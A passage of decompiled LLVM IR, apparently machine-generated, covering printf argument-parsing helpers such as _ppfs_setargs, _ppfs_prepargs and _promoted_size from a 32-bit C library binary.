  %v11_805148d = icmp eq i8 %v2_805148d, 37
  br i1 %v11_805148d, label %dec_label_pc_80514a8, label %dec_label_pc_8051492

dec_label_pc_8051492:                             ; preds = %dec_label_pc_805148c
  %v1_8051495 = load i32, i32* @ebx, align 4
  %v2_8051495 = inttoptr i32 %v1_8051495 to i32*
  store i32 %v1_805148c, i32* %v2_8051495, align 4
  %v0_8051497 = load i32, i32* @ebx, align 4
  %v1_8051498 = inttoptr i32 %v0_8051497 to i32*
  %v2_8051498 = call i32 @_ppfs_parsespec(i32* %v1_8051498)
  store i32 %v2_8051498, i32* %eax.global-to-local, align 4
  %v2_80514a0 = icmp slt i32 %v2_8051498, 0
  br i1 %v2_80514a0, label %dec_label_pc_80514b3, label %dec_label_pc_80514a4

dec_label_pc_80514a4:                             ; preds = %dec_label_pc_8051492
  %v0_80514a4 = load i32, i32* @ebx, align 4
  %v1_80514a4 = inttoptr i32 %v0_80514a4 to i32*
  %v2_80514a4 = load i32, i32* %v1_80514a4, align 4
  %v4_80514a9.pre.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80514a9.backedge

dec_label_pc_80514a8:                             ; preds = %dec_label_pc_805148c, %dec_label_pc_8051487
  %v0_80514a8 = phi i32 [ %v1_805148c, %dec_label_pc_805148c ], [ %v0_805148c27, %dec_label_pc_8051487 ]
  %v1_80514a8 = add i32 %v0_80514a8, 1
  br label %dec_label_pc_80514a9.backedge

dec_label_pc_80514a9.backedge:                    ; preds = %dec_label_pc_80514a8, %dec_label_pc_80514a4
  %v4_80514a9.be = phi i32 [ %v4_80514a9.pre.pre, %dec_label_pc_80514a4 ], [ %v6_80514a929, %dec_label_pc_80514a8 ]
  %v0_805148c.be = phi i32 [ %v2_80514a4, %dec_label_pc_80514a4 ], [ %v1_80514a8, %dec_label_pc_80514a8 ]
  store i32 %v0_805148c.be, i32* %eax.global-to-local, align 4
  %v1_80514a9 = inttoptr i32 %v0_805148c.be to i8*
  %v2_80514a9 = load i8, i8* %v1_80514a9, align 1
  %v3_80514a9 = zext i8 %v2_80514a9 to i32
  %v5_80514a9 = and i32 %v4_80514a9.be, -256
  %v6_80514a9 = or i32 %v3_80514a9, %v5_80514a9
  store i32 %v6_80514a9, i32* %edx.global-to-local, align 4
  %v4_80514ab = icmp eq i8 %v2_80514a9, 0
  %v1_80514ad = icmp eq i1 %v4_80514ab, false
  br i1 %v1_80514ad, label %dec_label_pc_8051487, label %dec_label_pc_80514a9.dec_label_pc_80514af_crit_edge

dec_label_pc_80514a9.dec_label_pc_80514af_crit_edge: ; preds = %dec_label_pc_80514a9.backedge
  %v0_80514af.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80514af

dec_label_pc_80514af:                             ; preds = %dec_label_pc_80514a9.dec_label_pc_80514af_crit_edge, %dec_label_pc_805147e
  %v0_80514af = phi i32 [ %v0_80514af.pre, %dec_label_pc_80514a9.dec_label_pc_80514af_crit_edge ], [ %v0_805147e, %dec_label_pc_805147e ]
  %v1_80514af = load i32, i32* @ebx, align 4
  %v2_80514af = inttoptr i32 %v1_80514af to i32*
  store i32 %v0_80514af, i32* %v2_80514af, align 4
  br label %dec_label_pc_80514b3

dec_label_pc_80514b3:                             ; preds = %dec_label_pc_8051492, %dec_label_pc_80514af
  %storemerge = phi i32 [ 0, %dec_label_pc_80514af ], [ -1, %dec_label_pc_8051492 ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v2_80514b3 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80514b3, i32* @edx, align 4
  %v2_80514b4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80514b4, i32* @ebx, align 4
  store i32 %v0_8051448, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v6_80514a9, { 1, 0 }
  uselistorder i8 %v2_80514a9, { 1, 2, 0 }
  uselistorder i32 %v0_805148c.be, { 2, 1, 0 }
  uselistorder i32 %v0_805148c27, { 1, 0 }
  uselistorder i32 %v0_805147e, { 1, 0, 2, 3 }
  uselistorder i32 %v1_805147b, { 0, 2, 1 }
  uselistorder i32 %v1_8051478, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 2, 3 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 8, 4, 5, 6, 7 }
  uselistorder i32 188, { 1, 0 }
  uselistorder label %dec_label_pc_80514b3, { 1, 0 }
  uselistorder label %dec_label_pc_8051487, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-12 = alloca i32, align 4
  %v0_80514b8 = load i32, i32* @esi, align 4
  %v0_80514b9 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_80514c5 = add i32 %arg1, 24
  %v2_80514c5 = inttoptr i32 %v1_80514c5 to i32*
  %v3_80514c5 = load i32, i32* %v2_80514c5, align 4
  %v2_80514c8 = add i32 %arg1, 76
  %v3_80514c8 = inttoptr i32 %v2_80514c8 to i32*
  store i32 %arg2, i32* %v3_80514c8, align 4
  %tmp8 = icmp slt i32 %v3_80514c5, 1
  br i1 %tmp8, label %dec_label_pc_80514f6, label %dec_label_pc_80514cf

dec_label_pc_80514cf:                             ; preds = %entry
  %v1_80514d2 = load i32, i32* @ebx, align 4
  %v2_80514d2 = add i32 %v1_80514d2, 28
  %v3_80514d2 = inttoptr i32 %v2_80514d2 to i32*
  store i32 %v3_80514c5, i32* %v3_80514d2, align 4
  %v0_80514d5 = load i32, i32* @ebx, align 4
  %v1_80514d5 = add i32 %v0_80514d5, 24
  %v2_80514d5 = inttoptr i32 %v1_80514d5 to i32*
  store i32 0, i32* %v2_80514d5, align 4
  %v0_80514dc = load i32, i32* @ebx, align 4
  %v1_80514dc = add i32 %v0_80514dc, 4
  %v2_80514dc = inttoptr i32 %v1_80514dc to i32*
  store i32 0, i32* %v2_80514dc, align 4
  %v0_80514e3 = load i32, i32* @ebx, align 4
  %v1_80514e3 = add i32 %v0_80514e3, 8
  %v2_80514e3 = inttoptr i32 %v1_80514e3 to i32*
  store i32 0, i32* %v2_80514e3, align 4
  %v0_80514ea = load i32, i32* @ebx, align 4
  %v1_80514eb = call i32 @_ppfs_setargs(i32 %v0_80514ea)
  %v1_80514f0 = load i32, i32* @ebx, align 4
  %v2_80514f0 = add i32 %v1_80514f0, 24
  %v3_80514f0 = inttoptr i32 %v2_80514f0 to i32*
  store i32 %v3_80514c5, i32* %v3_80514f0, align 4
  br label %dec_label_pc_80514f6

dec_label_pc_80514f6:                             ; preds = %entry, %dec_label_pc_80514cf
  %v2_80514f6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v0_80514b9, i32* @ebx, align 4
  store i32 %v0_80514b8, i32* @esi, align 4
  ret i32 %v2_80514f6

; uselistorder directives
  uselistorder i32 %v3_80514c5, { 1, 2, 0 }
  uselistorder i32 (i32)* @_ppfs_setargs, { 1, 0 }
  uselistorder i32 %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80514f6, { 1, 0 }
}

define i32 @_ppfs_setargs(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80514fd = load i32, i32* @ebx, align 4
  store i32 %v0_80514fd, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* @ecx, align 4
  %v1_8051502 = add i32 %arg1, 80
  store i32 %v1_8051502, i32* %ebx.global-to-local, align 4
  %v1_8051505 = add i32 %arg1, 24
  %v2_8051505 = inttoptr i32 %v1_8051505 to i32*
  %v3_8051505 = load i32, i32* %v2_8051505, align 4
  %v4_8051505 = icmp eq i32 %v3_8051505, 0
  %v1_8051509 = icmp eq i1 %v4_8051505, false
  %v1_80515bf = add i32 %arg1, 8
  %v2_80515bf = inttoptr i32 %v1_80515bf to i32*
  %v3_80515bf = load i32, i32* %v2_80515bf, align 4
  %v8_80515bf = icmp eq i32 %v3_80515bf, -2147483648
  %v1_80515c6 = icmp eq i1 %v8_80515bf, false
  br i1 %v1_8051509, label %dec_label_pc_80515bf, label %dec_label_pc_805150f

dec_label_pc_805150f:                             ; preds = %entry
  br i1 %v1_80515c6, label %dec_label_pc_8051529, label %dec_label_pc_8051518

dec_label_pc_8051518:                             ; preds = %dec_label_pc_805150f
  %v1_8051518 = add i32 %arg1, 76
  %v2_8051518 = inttoptr i32 %v1_8051518 to i32*
  %v3_8051518 = load i32, i32* %v2_8051518, align 4
  store i32 %v3_8051518, i32* %eax.global-to-local, align 4
  %v1_805151b = add i32 %v3_8051518, 4
  store i32 %v1_805151b, i32* %edx.global-to-local, align 4
  store i32 %v1_805151b, i32* %v2_8051518, align 4
  %v0_8051521 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051521 = inttoptr i32 %v0_8051521 to i32*
  %v2_8051521 = load i32, i32* %v1_8051521, align 4
  store i32 %v2_8051521, i32* %eax.global-to-local, align 4
  %v1_8051523 = load i32, i32* @ecx, align 4
  %v2_8051523 = add i32 %v1_8051523, 80
  %v3_8051523 = inttoptr i32 %v2_8051523 to i32*
  store i32 %v2_8051521, i32* %v3_8051523, align 4
  %v0_8051526 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051526 = load i32, i32* @ecx, align 4
  %v2_8051526 = add i32 %v1_8051526, 8
  %v3_8051526 = inttoptr i32 %v2_8051526 to i32*
  store i32 %v0_8051526, i32* %v3_8051526, align 4
  %v0_8051529.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051529

dec_label_pc_8051529:                             ; preds = %dec_label_pc_805150f, %dec_label_pc_8051518
  %v1_8051538 = phi i32 [ %arg1, %dec_label_pc_805150f ], [ %v0_8051529.pre, %dec_label_pc_8051518 ]
  %v1_8051529 = add i32 %v1_8051538, 4
  %v2_8051529 = inttoptr i32 %v1_8051529 to i32*
  %v3_8051529 = load i32, i32* %v2_8051529, align 4
  %v8_8051529 = icmp eq i32 %v3_8051529, -2147483648
  %v1_8051530 = icmp eq i1 %v8_8051529, false
  br i1 %v1_8051530, label %dec_label_pc_8051543, label %dec_label_pc_8051532

dec_label_pc_8051532:                             ; preds = %dec_label_pc_8051529
  %v1_8051532 = add i32 %v1_8051538, 76
  %v2_8051532 = inttoptr i32 %v1_8051532 to i32*
  %v3_8051532 = load i32, i32* %v2_8051532, align 4
  store i32 %v3_8051532, i32* %eax.global-to-local, align 4
  %v1_8051535 = add i32 %v3_8051532, 4
  store i32 %v1_8051535, i32* %edx.global-to-local, align 4
  store i32 %v1_8051535, i32* %v2_8051532, align 4
  %v0_805153b = load i32, i32* %eax.global-to-local, align 4
  %v1_805153b = inttoptr i32 %v0_805153b to i32*
  %v2_805153b = load i32, i32* %v1_805153b, align 4
  store i32 %v2_805153b, i32* %eax.global-to-local, align 4
  %v1_805153d = load i32, i32* @ecx, align 4
  %v2_805153d = add i32 %v1_805153d, 80
  %v3_805153d = inttoptr i32 %v2_805153d to i32*
  store i32 %v2_805153b, i32* %v3_805153d, align 4
  %v0_8051540 = load i32, i32* %eax.global-to-local, align 4
  %v1_8051540 = load i32, i32* @ecx, align 4
  %v2_8051540 = add i32 %v1_8051540, 4
  %v3_8051540 = inttoptr i32 %v2_8051540 to i32*
  store i32 %v0_8051540, i32* %v3_8051540, align 4
  %v1_80515b817.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_8051543

dec_label_pc_8051543:                             ; preds = %dec_label_pc_8051529, %dec_label_pc_8051532
  %v1_80515b817 = phi i32 [ %v1_8051538, %dec_label_pc_8051529 ], [ %v1_80515b817.pre, %dec_label_pc_8051532 ]
  store i32 0, i32* %esi.global-to-local, align 4
  %v2_80515b818 = add i32 %v1_80515b817, 28
  %v3_80515b819 = inttoptr i32 %v2_80515b818 to i32*
  %v4_80515b820 = load i32, i32* %v3_80515b819, align 4
  %v5_80515bb21 = icmp sgt i32 %v4_80515b820, 0
  br i1 %v5_80515bb21, label %dec_label_pc_8051547, label %dec_label_pc_80515ed.loopexit

dec_label_pc_8051547:                             ; preds = %dec_label_pc_8051543, %dec_label_pc_80515b7
  %v1_80515b823 = phi i32 [ %v1_80515b8, %dec_label_pc_80515b7 ], [ %v1_80515b817, %dec_label_pc_8051543 ]
  %v1_805154722 = phi i32 [ %v1_80515b7, %dec_label_pc_80515b7 ], [ 0, %dec_label_pc_8051543 ]
  %v2_8051547 = mul i32 %v1_805154722, 4
  %v3_8051547 = add i32 %v2_8051547, 40
  %v4_8051547 = add i32 %v3_8051547, %v1_80515b823
  %v5_8051547 = inttoptr i32 %v4_8051547 to i32*
  %v6_8051547 = load i32, i32* %v5_8051547, align 4
  store i32 %v6_8051547, i32* %eax.global-to-local, align 4
  %v1_805154b = add i32 %v6_8051547, -8
  %v9_805154b = icmp eq i32 %v1_805154b, 0
  br i1 %v9_805154b, label %dec_label_pc_80515b7, label %dec_label_pc_8051550

dec_label_pc_8051550:                             ; preds = %dec_label_pc_8051547
  %v10_805154b = icmp slt i32 %v1_805154b, 0
  %v6_805154b = sub i32 7, %v6_8051547
  %v7_805154b = and i32 %v6_805154b, %v6_8051547
  %v8_805154b = icmp slt i32 %v7_805154b, 0
  %v1_8051550 = add i32 %v1_80515b823, 76
  %v2_8051550 = inttoptr i32 %v1_8051550 to i32*
  %v3_8051550 = load i32, i32* %v2_8051550, align 4
  store i32 %v3_8051550, i32* %edx.global-to-local, align 4
  %v3_8051553 = icmp eq i1 %v10_805154b, %v8_805154b
  br i1 %v3_8051553, label %dec_label_pc_8051563, label %dec_label_pc_8051555

dec_label_pc_8051555:                             ; preds = %dec_label_pc_8051550
  %tmp15 = icmp slt i32 %v6_8051547, 3
  %v9_805155c = icmp eq i32 %v6_8051547, 7
  %v1_805155f = icmp eq i1 %v9_805155c, false
  %or.cond = or i1 %tmp15, %v1_805155f
  br i1 %or.cond, label %dec_label_pc_80515aa, label %dec_label_pc_805158c

dec_label_pc_8051563:                             ; preds = %dec_label_pc_8051550
  %tmp16 = icmp sgt i32 %v6_8051547, 1024
  br i1 %tmp16, label %dec_label_pc_805156c, label %dec_label_pc_80515aa

dec_label_pc_805156c:                             ; preds = %dec_label_pc_8051563
  %v6_805156c = icmp eq i32 %v6_8051547, 2048
  br i1 %v6_805156c, label %dec_label_pc_805157c, label %dec_label_pc_8051573

dec_label_pc_8051573:                             ; preds = %dec_label_pc_805156c
  %v9_8051573 = icmp eq i32 %v6_8051547, 2055
  %v1_8051578 = icmp eq i1 %v9_8051573, false
  br i1 %v1_8051578, label %dec_label_pc_80515aa, label %dec_label_pc_805159b

dec_label_pc_805157c:                             ; preds = %dec_label_pc_805156c
  %v1_805157c = add i32 %v3_8051550, 8
  store i32 %v1_805157c, i32* %eax.global-to-local, align 4
  store i32 %v1_805157c, i32* %v2_8051550, align 4
  %v0_8051582 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051582 = inttoptr i32 %v0_8051582 to i32*
  %v2_8051582 = load i32, i32* %v1_8051582, align 4
  store i32 %v2_8051582, i32* %eax.global-to-local, align 4
  %v1_8051584 = add i32 %v0_8051582, 4
  %v2_8051584 = inttoptr i32 %v1_8051584 to i32*
  %v3_8051584 = load i32, i32* %v2_8051584, align 4
  store i32 %v3_8051584, i32* %edx.global-to-local, align 4
  %v1_8051587 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8051587 = add i32 %v1_8051587, 4
  %v3_8051587 = inttoptr i32 %v2_8051587 to i32*
  store i32 %v3_8051584, i32* %v3_8051587, align 4
  %v0_80515b2.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515b2

dec_label_pc_805158c:                             ; preds = %dec_label_pc_8051555
  %v3_805158c = load i32, i32* %v2_8051550, align 4
  store i32 %v3_805158c, i32* %edx.global-to-local, align 4
  %v1_805158f = add i32 %v3_805158c, 8
  store i32 %v1_805158f, i32* %eax.global-to-local, align 4
  store i32 %v1_805158f, i32* %v2_8051550, align 4
  %v0_8051595 = load i32, i32* %edx.global-to-local, align 4
  %v1_8051595 = inttoptr i32 %v0_8051595 to double*
  %v2_8051595 = load double, double* %v1_8051595, align 4
  %v2_8051597 = load i32, i32* %ebx.global-to-local, align 4
  %v4_8051597 = inttoptr i32 %v2_8051597 to double*
  store double %v2_8051595, double* %v4_8051597, align 4
  br label %dec_label_pc_80515b4

dec_label_pc_805159b:                             ; preds = %dec_label_pc_8051573
  %v3_805159b = load i32, i32* %v2_8051550, align 4
  store i32 %v3_805159b, i32* %edx.global-to-local, align 4
  %v1_805159e = add i32 %v3_805159b, 12
  store i32 %v1_805159e, i32* %eax.global-to-local, align 4
  store i32 %v1_805159e, i32* %v2_8051550, align 4
  %v0_80515a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515a4 = inttoptr i32 %v0_80515a4 to x86_fp80*
  %v2_80515a4 = load x86_fp80, x86_fp80* %v1_80515a4, align 4
  %v2_80515a6 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80515a6 = inttoptr i32 %v2_80515a6 to x86_fp80*
  store x86_fp80 %v2_80515a4, x86_fp80* %v3_80515a6, align 4
  br label %dec_label_pc_80515b4

dec_label_pc_80515aa:                             ; preds = %dec_label_pc_8051555, %dec_label_pc_8051563, %dec_label_pc_8051573
  %v1_80515aa = add i32 %v3_8051550, 4
  store i32 %v1_80515aa, i32* %eax.global-to-local, align 4
  store i32 %v1_80515aa, i32* %v2_8051550, align 4
  %v0_80515b0 = load i32, i32* %edx.global-to-local, align 4
  %v1_80515b0 = inttoptr i32 %v0_80515b0 to i32*
  %v2_80515b0 = load i32, i32* %v1_80515b0, align 4
  store i32 %v2_80515b0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80515b2

dec_label_pc_80515b2:                             ; preds = %dec_label_pc_805157c, %dec_label_pc_80515aa
  %v0_80515b2 = phi i32 [ %v0_80515b2.pre, %dec_label_pc_805157c ], [ %v2_80515b0, %dec_label_pc_80515aa ]
  %v1_80515b2 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80515b2 = inttoptr i32 %v1_80515b2 to i32*
  store i32 %v0_80515b2, i32* %v2_80515b2, align 4
  %v0_80515b4.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_80515b4

dec_label_pc_80515b4:                             ; preds = %dec_label_pc_805159b, %dec_label_pc_805158c, %dec_label_pc_80515b2
  %v0_80515b4 = phi i32 [ %v2_80515a6, %dec_label_pc_805159b ], [ %v2_8051597, %dec_label_pc_805158c ], [ %v0_80515b4.pre, %dec_label_pc_80515b2 ]
  %v1_80515b4 = add i32 %v0_80515b4, 12
  store i32 %v1_80515b4, i32* %ebx.global-to-local, align 4
  %v0_80515b7.pre = load i32, i32* %esi.global-to-local, align 4
  %v1_80515b8.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80515b7

dec_label_pc_80515b7:                             ; preds = %dec_label_pc_8051547, %dec_label_pc_80515b4
  %v1_80515b8 = phi i32 [ %v1_80515b823, %dec_label_pc_8051547 ], [ %v1_80515b8.pre, %dec_label_pc_80515b4 ]
  %v0_80515b7 = phi i32 [ %v1_805154722, %dec_label_pc_8051547 ], [ %v0_80515b7.pre, %dec_label_pc_80515b4 ]
  %v1_80515b7 = add i32 %v0_80515b7, 1
  store i32 %v1_80515b7, i32* %esi.global-to-local, align 4
  %v2_80515b8 = add i32 %v1_80515b8, 28
  %v3_80515b8 = inttoptr i32 %v2_80515b8 to i32*
  %v4_80515b8 = load i32, i32* %v3_80515b8, align 4
  %v5_80515bb = icmp slt i32 %v1_80515b7, %v4_80515b8
  br i1 %v5_80515bb, label %dec_label_pc_8051547, label %dec_label_pc_80515ed.loopexit

dec_label_pc_80515bf:                             ; preds = %entry
  br i1 %v1_80515c6, label %dec_label_pc_80515d6, label %dec_label_pc_80515c8

dec_label_pc_80515c8:                             ; preds = %dec_label_pc_80515bf
  %v1_80515c8 = add i32 %arg1, 36
  %v2_80515c8 = inttoptr i32 %v1_80515c8 to i8*
  %v3_80515c8 = load i8, i8* %v2_80515c8, align 1
  %v2_80515cc = zext i8 %v3_80515c8 to i32
  %v3_80515cc = mul nuw nsw i32 %v2_80515cc, 12
  store i32 %v3_80515cc, i32* %eax.global-to-local, align 4
  %v2_80515cf = add i32 %arg1, 68
  %v3_80515cf = add i32 %v2_80515cf, %v3_80515cc
  %v4_80515cf = inttoptr i32 %v3_80515cf to i32*
  %v5_80515cf = load i32, i32* %v4_80515cf, align 4
  store i32 %v5_80515cf, i32* %eax.global-to-local, align 4
  store i32 %v5_80515cf, i32* %v2_80515bf, align 4
  %v0_80515d6.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80515d6

dec_label_pc_80515d6:                             ; preds = %dec_label_pc_80515bf, %dec_label_pc_80515c8
  %v1_80515ea = phi i32 [ %arg1, %dec_label_pc_80515bf ], [ %v0_80515d6.pre, %dec_label_pc_80515c8 ]
  %v1_80515d6 = add i32 %v1_80515ea, 4
  %v2_80515d6 = inttoptr i32 %v1_80515d6 to i32*
  %v3_80515d6 = load i32, i32* %v2_80515d6, align 4
  %v8_80515d6 = icmp eq i32 %v3_80515d6, -2147483648
  %v1_80515dd = icmp eq i1 %v8_80515d6, false
  br i1 %v1_80515dd, label %dec_label_pc_80515ed, label %dec_label_pc_80515df

dec_label_pc_80515df:                             ; preds = %dec_label_pc_80515d6
  %v1_80515df = add i32 %v1_80515ea, 37
  %v2_80515df = inttoptr i32 %v1_80515df to i8*
  %v3_80515df = load i8, i8* %v2_80515df, align 1
  %v2_80515e3 = zext i8 %v3_80515df to i32
  %v3_80515e3 = mul nuw nsw i32 %v2_80515e3, 12
  store i32 %v3_80515e3, i32* %eax.global-to-local, align 4
  %v1_80515e6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_80515e6 = add nsw i32 %v3_80515e3, -12
  %v3_80515e6 = add i32 %v2_80515e6, %v1_80515e6
  %v4_80515e6 = inttoptr i32 %v3_80515e6 to i32*
  %v5_80515e6 = load i32, i32* %v4_80515e6, align 4
  store i32 %v5_80515e6, i32* %eax.global-to-local, align 4
  store i32 %v5_80515e6, i32* %v2_80515d6, align 4
  %v0_80515ed.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_80515ed

dec_label_pc_80515ed.loopexit:                    ; preds = %dec_label_pc_80515b7, %dec_label_pc_8051543
  %v1_80515b8.lcssa = phi i32 [ %v1_80515b817, %dec_label_pc_8051543 ], [ %v1_80515b8, %dec_label_pc_80515b7 ]
  br label %dec_label_pc_80515ed

dec_label_pc_80515ed:                             ; preds = %dec_label_pc_80515ed.loopexit, %dec_label_pc_80515d6, %dec_label_pc_80515df
  %v10_80515f4 = phi i32 [ %v1_80515b8.lcssa, %dec_label_pc_80515ed.loopexit ], [ %v1_80515ea, %dec_label_pc_80515d6 ], [ %v0_80515ed.pre, %dec_label_pc_80515df ]
  %v1_80515ed = add i32 %v10_80515f4, 8
  %v2_80515ed = inttoptr i32 %v1_80515ed to i32*
  %v3_80515ed = load i32, i32* %v2_80515ed, align 4
  store i32 %v3_80515ed, i32* %eax.global-to-local, align 4
  %v2_80515f0 = icmp slt i32 %v3_80515ed, 0
  %v1_80515f2 = icmp eq i1 %v2_80515f0, false
  br i1 %v1_80515f2, label %dec_label_pc_8051608, label %dec_label_pc_80515f4

dec_label_pc_80515f4:                             ; preds = %dec_label_pc_80515ed
  %v1_80515f4 = add i32 %v10_80515f4, 16
  %v2_80515f4 = inttoptr i32 %v1_80515f4 to i32*
  %v3_80515f4 = load i32, i32* %v2_80515f4, align 4
  %v4_80515f4 = or i32 %v3_80515f4, 8
  store i32 %v4_80515f4, i32* %v2_80515f4, align 4
  %v0_80515f8 = load i32, i32* @ecx, align 4
  %v1_80515f8 = add i32 %v0_80515f8, 16
  %v2_80515f8 = inttoptr i32 %v1_80515f8 to i32*
  %v3_80515f8 = load i32, i32* %v2_80515f8, align 4
  %v4_80515f8 = and i32 %v3_80515f8, -2
  store i32 %v4_80515f8, i32* %v2_80515f8, align 4
  %v0_80515fc = load i32, i32* %eax.global-to-local, align 4
  %v1_80515fc = sub i32 0, %v0_80515fc
  store i32 %v1_80515fc, i32* %eax.global-to-local, align 4
  %v1_80515fe = load i32, i32* @ecx, align 4
  %v2_80515fe = add i32 %v1_80515fe, 8
  %v3_80515fe = inttoptr i32 %v2_80515fe to i32*
  store i32 %v1_80515fc, i32* %v3_80515fe, align 4
  %v0_8051601 = load i32, i32* @ecx, align 4
  %v1_8051601 = add i32 %v0_8051601, 20
  %v2_8051601 = inttoptr i32 %v1_8051601 to i32*
  store i32 32, i32* %v2_8051601, align 4
  %v0_805160a.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8051608

dec_label_pc_8051608:                             ; preds = %dec_label_pc_80515ed, %dec_label_pc_80515f4
  %v0_805160a = phi i32 [ %v3_80515ed, %dec_label_pc_80515ed ], [ %v0_805160a.pre, %dec_label_pc_80515f4 ]
  %v2_8051608 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8051608, i32* @ebx, align 4
  ret i32 %v0_805160a

; uselistorder directives
  uselistorder i32 %v3_80515e3, { 1, 0 }
  uselistorder i32 %v3_80515cc, { 1, 0 }
  uselistorder i32 %v1_80515b7, { 2, 1, 0 }
  uselistorder i32 %v1_80515b8, { 0, 2, 1 }
  uselistorder i32 %v3_8051550, { 1, 0, 2 }
  uselistorder i32* %v2_8051550, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 %v1_805154b, { 1, 0 }
  uselistorder i32 %v6_8051547, { 3, 4, 5, 2, 1, 0, 7, 6, 8 }
  uselistorder i32 %v1_805154722, { 1, 0 }
  uselistorder i1 %v1_80515c6, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 5, 0, 1, 2, 3, 4, 6, 7, 8, 9 }
  uselistorder i32* %ebx.global-to-local, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 1, 0, 2, 3, 4, 5, 8, 7, 6 }
  uselistorder label %dec_label_pc_8051608, { 1, 0 }
  uselistorder label %dec_label_pc_80515ed, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80515d6, { 1, 0 }
  uselistorder label %dec_label_pc_80515b7, { 1, 0 }
  uselistorder label %dec_label_pc_80515b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80515b2, { 1, 0 }
  uselistorder label %dec_label_pc_80515aa, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8051547, { 1, 0 }
  uselistorder label %dec_label_pc_8051543, { 1, 0 }
  uselistorder label %dec_label_pc_8051529, { 1, 0 }
}

define i32 @_promoted_size(i32 %arg1) local_unnamed_addr {
entry:
  %v0_805160c = load i32, i32* @eax, align 4
  br label %dec_label_pc_8051613

dec_label_pc_8051613:                             ; preds = %dec_label_pc_8051613, %entry
  %v0_8051613 = phi i32 [ ptrtoint (i8** @global_var_805938a.474 to i32), %entry ], [ %v1_8051613, %dec_label_pc_8051613 ]
  %v1_8051613 = add i32 %v0_8051613, -2
  %v1_8051616 = inttoptr i32 %v1_8051613 to i16*
  %v2_8051616 = load i16, i16* %v1_8051616, align 2
  %v3_8051616 = sext i16 %v2_8051616 to i32
  %v12_8051619 = icmp ne i32 %v3_8051616, %v0_805160c
  %v6_8051623 = icmp ugt i32 %v1_8051613, ptrtoint (i32* @global_var_8059372.475 to i32)
  %or.cond = and i1 %v6_8051623, %v12_8051619
  br i1 %or.cond, label %dec_label_pc_8051613, label %dec_label_pc_8051625

dec_label_pc_8051625:                             ; preds = %dec_label_pc_8051613
  %.pre = add i32 %v0_8051613, -134583156
  %v2_805162b = sdiv i32 %.pre, 2
  store i32 %v2_805162b, i32* @edx, align 4
  %v1_805162d = add i32 %v2_805162b, ptrtoint (i8** @global_var_805938a.474 to i32)
  %v2_805162d = inttoptr i32 %v1_805162d to i8*
  %v3_805162d = load i8, i8* %v2_805162d, align 1
  %v4_805162d = zext i8 %v3_805162d to i32
  ret i32 %v4_805162d

; uselistorder directives
  uselistorder i32 %v2_805162b, { 1, 0 }
  uselistorder i32 %v1_8051613, { 1, 2, 0 }
  uselistorder i32 ptrtoint (i8** @global_var_805938a.474 to i32), { 1, 0 }
}

define i32 @_ppfs_parsespec(i32* %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %tmp76 = ptrtoint i32* %arg1 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-71 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8051636 = load i32, i32* @edi, align 4
  %v0_8051637 = load i32, i32* @esi, align 4
  %v0_8051638 = load i32, i32* @ebx, align 4
  store i32 %v0_8051638, i32* %stack_var_-16, align 4
  %v4_8051638 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_8051664 = add i32 %tmp76, 24
  %v2_8051664 = inttoptr i32 %v1_8051664 to i32*
  %v3_8051664 = load i32, i32* %v2_8051664, align 4
  store i32 %v3_8051664, i32* %eax.global-to-local, align 4
  %v1_805166b = add i32 %tmp76, 16
  %v2_805166b = inttoptr i32 %v1_805166b to i32*
